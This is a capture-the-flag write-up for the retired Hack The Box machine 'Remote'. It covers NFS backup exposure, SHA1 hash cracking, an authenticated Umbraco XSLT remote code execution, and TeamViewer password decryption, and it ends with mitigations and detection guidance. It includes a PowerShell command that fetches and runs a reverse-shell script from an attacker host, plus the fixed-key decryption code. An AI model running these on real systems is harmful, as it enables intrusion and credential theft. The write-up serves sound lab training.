---
machine: Remote
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / Web
state: Retired
tags: [windows, nfs, umbraco, sha1, xslt, rce, teamviewer, cve-2019-18988]
---

# Remote — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

An empty anonymous FTP, an IIS running Umbraco and an NFS export `/site_backups` open to everyone. The backup holds `Web.config` and `App_Data/Umbraco.sdf`, which yields the unsalted SHA1 hash of `admin@htb.local`; the dictionary breaks it. With that account the authenticated RCE in Umbraco 7.12.4 (`xsltVisualize.aspx` with `msxsl:script`) gives code execution as `defaultapppool`. The registry keeps TeamViewer 7's password encrypted with the product's fixed AES key; once decrypted, it turns out the local administrator reuses that same password.

## Recon

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 21,80,111,135,139,445,2049,5985 -sCV -oA nmap_svc <IP>
```

```text
21/tcp   open  ftp        Microsoft ftpd (anonymous allowed)
80/tcp   open  http       Microsoft HTTPAPI httpd 2.0
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
5985/tcp open  wsman
```

- Anonymous FTP is empty: it adds nothing.
- SMB rejects null sessions, but the NFS export is open to `everyone`.
- The site is an IIS serving the "Acme Widgets" page with Umbraco behind it.

```bash
printf '%s\n' '<IP> remote.htb' | sudo tee -a /etc/hosts
```

## Enumeration

```bash
showmount -e <IP>          # /site_backups (everyone)
sudo mount -t nfs -o vers=3,nolock <IP>:/site_backups /mnt/
ls /mnt/
```

The export is the application root: `Web.config`, `bin/`, `Umbraco/`, `App_Data/`. `Web.config` confirms the version and the connection string; `App_Data/Umbraco.sdf` is the SQL Server Compact database with the users.

```bash
strings /mnt/App_Data/Umbraco.sdf | grep -i 'admin@'
```

```text
admin@htb.local ... b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
```

It is unsalted SHA1. The working login is the full email, not `admin`:

```bash
hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

## Foothold

Umbraco 7.12.4 has an authenticated RCE: the backoffice XSLT visualiser accepts an `xsltSelection` with an `msxsl:script` block that runs C# in the pool's context.

```bash
searchsploit umbraco 7.12
# Exploit-DB 46153 · CVE-2019-25137
python3 46153.py -u 'admin@htb.local' -p '<PASSWORD>' -i http://remote.htb -c whoami
```

```text
iis apppool\defaultapppool
```

For an interactive shell, PowerShell downloads a payload from the attacker:

```bash
python3 46153.py -u 'admin@htb.local' -p '<PASSWORD>' -i http://remote.htb \
  -c powershell.exe -a "-NoProfile -Command iex(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"
```

Why it works: `developer/Xslt/xsltVisualize.aspx` is available to CMS administrators and compiles the XSLT with `msxsl:script`, which allows arbitrary C#. No memory corruption or exposed service is needed.

## Lateral movement

There is no domain or second host. The hop is from `defaultapppool` to `Administrator` on the same server, through a credential recovered from the registry.

## Privilege escalation

```powershell
tasklist /svc | findstr /i teamviewer
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7" /v SecurityPasswordAES
```

TeamViewer 7 stores the unattended access password with an AES key shared by every installation (CVE-2019-18988). The `SecurityPasswordAES` value decrypts with AES-128-CBC, key `0602000000a400005253413100040000` and IV `0100010067244F436E6762F25EA8D704`, and the result is read as UTF-16LE:

```python
from Crypto.Cipher import AES
key = bytes.fromhex('0602000000a400005253413100040000')
iv  = bytes.fromhex('0100010067244F436E6762F25EA8D704')
ct  = bytes.fromhex('<SECURITYPASSWORDAES>')
print(AES.new(key, AES.MODE_CBC, iv).decrypt(ct).decode('utf-16-le').rstrip('\x00'))
```

The resulting password is the local administrator's:

```bash
evil-winrm -u Administrator -p '<PASSWORD>' -i remote.htb
# remote\administrator
psexec.py 'Administrator:<PASSWORD>@remote.htb'    # nt authority\system
```

`CVE-2019-18988` describes the password exposure, not a direct elevation: the escalation exists because the password is reused on the local account. The `UsoSvc` alternative seen in some write-ups is a service permission misconfiguration, not the intended path.

## Evidence

- `showmount -e` with the export and `ls` of the backup.
- The SHA1 hash record truncated, and the decrypted password redacted.
- `whoami` as `defaultapppool`.
- `reg query` of `SecurityPasswordAES` with the value truncated.
- No flags or full hashes.

## Lessons learned

- An NFS export open to `everyone` effectively publishes the application's code and database.
- A SQL Server Compact database reads with `strings`: Microsoft's tooling is not required.
- Umbraco 7.x with administrator credentials is code execution by backoffice design.
- A product's fixed AES key turns a local secret into a credential anyone with registry access can recover.
- Password reuse is what turns a leak into an escalation.

## Mitigations and detection

- Restrict NFS exports by host and user; never export the application directory.
- Move backups and databases out of the web tree; store salted, slow hashes (bcrypt/PBKDF2), not SHA1.
- Update Umbraco and restrict backoffice access by network or VPN; remove `xsltVisualize.aspx` if unused.
- Update TeamViewer and rotate the unattended password; do not reuse it on system accounts.
- Detection: NFS mounts from unusual hosts; reads of `App_Data/*.sdf`; `POST` to `xsltVisualize.aspx` with `msxsl:script`; `w3wp.exe` spawning `cmd`/`powershell`; access to `HKLM\...\TeamViewer\Version7` from a web service account.

MITRE: T1135, T1552.001, T1110.002, T1190, T1059.001, T1059.003, T1552.002, T1078.003, T1021.006.

## References

- <https://0xdf.gitlab.io/2020/09/05/htb-remote.html>
- <https://netosec.com/remote-hackthebox-writeup>
- <https://www.exploit-db.com/exploits/46153>
- <https://nvd.nist.gov/vuln/detail/CVE-2019-25137>
- <https://nvd.nist.gov/vuln/detail/CVE-2019-18988>
